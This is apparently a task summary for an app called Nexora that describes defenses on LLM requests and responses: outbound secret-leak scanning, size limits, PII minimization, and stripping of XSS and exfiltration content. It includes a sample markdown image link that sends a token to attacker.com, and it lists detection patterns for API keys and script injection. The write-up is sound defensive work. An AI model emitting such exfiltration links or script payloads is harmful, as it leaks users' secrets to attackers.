# Task 15 — Prompt Injection, AI Privacy & LLM Security Hardening

## Architectural Scope & Objectives
Task 15 implements enterprise-grade LLM security hardening, prompt injection defense, and AI privacy minimization across Nexora (`server/src/domain/ai/aiSecurityAuditor.js` and `server/src/utils/promptSanitizer.js`).

---

## Outbound Security & Data Minimization Guardrails

### 1. Secret Leak Prevention
Before any payload leaves the server to Google Gemini or any external model provider, `auditOutboundAiRequest` scans all system and user text for:
- Google/Gemini API keys (`AIzaSy...`)
- OpenAI / Anthropic API keys (`sk-...`, `sk-ant-...`)
- JSON Web Tokens (`eyJ...`)
- Database connection strings (`mongodb://...`, `mongodb+srv://...`, `postgres://...`)
- Private keys, passwords, and authorization headers

Any detected secret triggers an immediate outbound block (`AI_SECURITY_VIOLATION_TYPE.SECRET_LEAK_PREVENTED`), terminating the request before external transmission.

### 2. Denial-of-Wallet & Context Flooding Defense
Enforces strict character limits per contract:
- Resume Extraction: Max 100,000 characters
- Interview Evaluation: Max 15,000 characters
- CareerTwin Narrative: Max 5,000 characters
- Role Proposal: Max 2,000 characters
Attempts to flood prompts beyond context bounds are rejected with HTTP 400.

### 3. PII Minimization
For presentation-only prompts (`CAREERTWIN_NARRATIVE`), candidate personally identifiable information (PII) including email addresses, phone numbers, and full resume prose is strictly blocked from transmission. Only anonymized, aggregated indicators (e.g. project counts, target role titles, branch of study) are transmitted.

---

## Inbound Response Security & Exfiltration Hardening

### 1. Markdown Image Data Exfiltration Defense
Detects and neutralizes image link exfiltration vectors (`![leak](https://attacker.com/collect?token=...)`) replacing them with `[REDACTED_IMAGE_EXFILTRATION]`.

### 2. XSS & Malicious Script Neutralization
Strips `<script>` blocks, inline event handlers (`onload=`, `onerror=`), and `javascript:` URIs from all model outputs before they reach frontend renderers or the database.

### 3. Reflected Secret Neutralization
If a model response echoes or reflects a credential pattern, it is scrubbed with `[REDACTED_SECRET]`.

---

## Verification & Automated Test Coverage
- Test Suite: `server/tests/aiSecurityAndPrivacy.test.js` (9 tests passing)
- Co-tested Suites:
  - `server/tests/aiContracts.test.js` (9 tests passing)
  - `server/tests/aiValidationPipeline.test.js` (10 tests passing)
- Key verified test scenarios:
  1. Outbound interception of Google Gemini keys and MongoDB connection URIs.
  2. Context flooding denial-of-wallet defense (400 Bad Request).
  3. CareerTwin PII minimization enforcement (blocking candidate email and phone).
  4. Inbound XSS and event handler scrubbing.
  5. Inbound markdown image exfiltration link neutralization.
  6. End-to-end integration via `requestCompletion`.
